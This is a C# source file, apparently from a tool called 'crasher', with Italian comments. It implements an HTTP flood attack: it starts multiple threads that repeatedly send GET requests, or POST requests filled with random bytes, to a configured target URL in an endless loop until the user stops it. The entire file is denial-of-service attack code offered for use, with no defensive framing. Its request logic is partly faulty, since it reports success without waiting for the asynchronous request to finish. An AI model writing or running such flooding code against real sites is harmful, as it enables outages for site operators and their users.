using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using crasher.Model;
using WebException = System.Net.WebException;

namespace crasher.Attacks
{
    public static class ClientRequest
    {
        private static WebClient client;
        private static Thread[] threads;
        private static bool stopFlag = false;
        private static Uri Url;
        private static bool ThreadsStarted = false;
        /**
         * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
         * **/
        public static void Start()
        {
            Console.Clear();
            Url = new Uri(AttackSettings.Url);
            client = new WebClient();

            Console.WriteLine("Threading mode: " + AttackSettings.Threading);
            if (AttackSettings.Threading)
            {
                threads = new Thread[AttackSettings.Threads];
                StartAsyncAttack();
            }
            else
            {
                stopFlag = false;
                StartAttack();
            }

            Console.WriteLine("Started client attack");
        }

        /**
         * Attacco sfruttando i thread
         * **/
        private static void StartAsyncAttack()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(StartAttack);
                threads[i].Start();

                Console.WriteLine("[INFO] Thread n." + i + " started attacking target: " + Url.ToString());
            }

            ThreadsStarted = true;
        }

        /**
         * Attacco utilizzando nessun thread.
         * **/
        private static void StartAttack()
        {
            while (!stopFlag)
            {
                if (ThreadsStarted || !AttackSettings.Threading)
                {
                    bool requestStatus = false;
                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
                    
                    //WebResponse response = SendData(Url,packet,out requestStatus);
                    SendRequest(Url,out requestStatus);
                    if (requestStatus)
                    {
                        Console.WriteLine("OK");
                    }
                    else
                    {
                        Console.WriteLine("Request failed..");
                    }
                }
                else if (!ThreadsStarted)
                {
                    System.Threading.Thread.Sleep(250);
                }
            }
        }
        /**
         * Ferma l'attacco a seconda del tipo utilizzato
         * **/
        public static void Stop() {
            if (AttackSettings.Threading)
                StopAsyncAttack();
            else
                StopAttack();
        }

        /**
         * Ferma l'attacco senza thread utilizzando un flag che genera un break
         */
        private static void StopAttack()
        {
            stopFlag = true;
        }

        /**
        * Esegue l'abort su tutti i thread.
        * **/
        private static void StopAsyncAttack() {
            foreach (Thread thread in threads) {
                thread.Abort("Stopped attack by user");
            }
        }

        public static void SendRequest(Uri url, out bool status)
        {
            WebClient client = new WebClient();
            string response = null;
            try
            {
                client.DownloadStringAsync(Url);
            }
            catch (WebException we)
            {
                Console.WriteLine("ERROR: " + we.Message);
                status = false;
                return;
            }
            finally
            {
                client.Dispose();
            }

            status = true;
        }

        public static WebResponse SendData(Uri url, byte[] data, out bool status)
        {
            WebRequest request = WebRequest.Create(url);
            request.Method = "POST";

            byte[] byteArray = data;
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;

            try
            {
                Stream dataStream = request.GetRequestStream();
                // Write the data to the request stream.  
                dataStream.Write(byteArray, 0, byteArray.Length);
                // Close the Stream object.  
                dataStream.Close();
            }
            catch (WebException we)
            {
                status = false;
                return null;
            }


            //SOME SITES DO HTTP ERROR CODE 500
            status = true;
            try
            {
                return request.GetResponse();

            }
            catch (WebException ex)
            {
                return null;
            }
        }
    }
}
